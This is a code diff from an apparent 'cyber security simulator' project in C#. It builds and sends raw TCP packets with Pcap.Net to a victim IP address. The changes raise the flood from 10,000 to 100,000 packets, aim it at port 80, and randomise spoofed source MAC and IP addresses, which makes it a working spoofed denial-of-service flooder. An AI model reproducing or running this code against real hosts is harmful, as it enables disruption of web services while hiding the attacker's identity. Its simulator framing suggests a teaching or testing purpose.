@@ -42,7 +42,7 @@ namespace PDA_Cyber_Security_Simulator_V1
             }
 
             // Print the list
-            for (int i = 0; i != allDevices.Count; ++i)
+            /*for (int i = 0; i != allDevices.Count; ++i)
             {
                 LivePacketDevice device = allDevices[i];
                 Console.Write((i + 1) + ". " + device.Name);
@@ -62,10 +62,10 @@ namespace PDA_Cyber_Security_Simulator_V1
                 {
                     deviceIndex = 0;
                 }
-            } while (deviceIndex == 0);
+            } while (deviceIndex == 0);*/
 
             // Take the selected adapter
-            PacketDevice selectedDevice = allDevices[deviceIndex - 1];
+            PacketDevice selectedDevice = allDevices[0];
 
             // Open the output device
             using (PacketCommunicator communicator = selectedDevice.Open(100, // name of the device
@@ -73,7 +73,7 @@ namespace PDA_Cyber_Security_Simulator_V1
                                                                          1000)) // read timeout
             {
                 // Supposing to be on ethernet, set mac source to 01:01:01:01:01:01
-                string randMac = rand.Next(0, 9).ToString() + rand.Next(0, 9).ToString() + ":" + rand.Next(0, 9).ToString() + rand.Next(0, 9).ToString() + ":" + rand.Next(0, 9).ToString() + rand.Next(0, 9).ToString() + ":" + rand.Next(0, 9).ToString() + rand.Next(0, 9).ToString() + ":" + rand.Next(0, 9).ToString() + rand.Next(0, 9).ToString() + ":" + rand.Next(0, 9).ToString() + rand.Next(0, 9).ToString();
+                string randMac = "4C:0C:BD:" + rand.Next(2, 9).ToString() + rand.Next(2, 9).ToString() + ":" + rand.Next(2, 9).ToString() + rand.Next(2, 9).ToString() + ":" + rand.Next(2, 9).ToString() + rand.Next(2, 9).ToString();
                 MacAddress source = new MacAddress(randMac);
 
                 // set mac destination to 02:02:02:02:02:02
@@ -91,7 +91,7 @@ namespace PDA_Cyber_Security_Simulator_V1
                 // IPv4 Layer
                 IpV4Layer ipV4Layer = new IpV4Layer
                 {
-                    Source = new IpV4Address("192.168.1.4"),
+                    Source = new IpV4Address("192.168.1.101"),
                     CurrentDestination = new IpV4Address(victimIpAddress),
                     Ttl = 128,
                     // The rest of the important parameters will be set for each packet
@@ -107,18 +107,18 @@ namespace PDA_Cyber_Security_Simulator_V1
                 PacketBuilder builder = new PacketBuilder(ethernetLayer, ipV4Layer, tcpLayer);
 
                 // Send 100 Pings to different destination with different parameters
-                for (int i = 0; i != 10000; ++i)
+                for (int i = 0; i != 100000; ++i)
                 {
-                    randMac = rand.Next(0, 9).ToString() + rand.Next(0, 9).ToString() + ":" + rand.Next(0, 9).ToString() + rand.Next(0, 9).ToString() + ":" + rand.Next(0, 9).ToString() + rand.Next(0, 9).ToString() + ":" + rand.Next(0, 9).ToString() + rand.Next(0, 9).ToString() + ":" + rand.Next(0, 9).ToString() + rand.Next(0, 9).ToString() + ":" + rand.Next(0, 9).ToString() + rand.Next(0, 9).ToString();
+                    randMac = "4C:0C:BD:" + rand.Next(2, 9).ToString() + rand.Next(2, 9).ToString() + ":" + rand.Next(2, 9).ToString() + rand.Next(2, 9).ToString() + ":" + rand.Next(2, 9).ToString() + rand.Next(2, 9).ToString();
                     ethernetLayer.Source = new MacAddress(randMac);
 
                     // Set IPv4 parameters
-                    ipV4Layer.Source = new IpV4Address("192.168.1." + rand.Next(5, 97).ToString());
+                    ipV4Layer.Source = new IpV4Address("192.168.1." + rand.Next(102, 199).ToString());
                     ipV4Layer.Identification = (ushort)i;
 
                     // Set TCP parameters
                     tcpLayer.SourcePort = (ushort)(rand.Next(0, 1000) + 33000);
-                    tcpLayer.DestinationPort = (ushort)8080;
+                    tcpLayer.DestinationPort = (ushort)80;
 
                     // Build the packet
                     Packet packet = builder.Build(DateTime.Now);
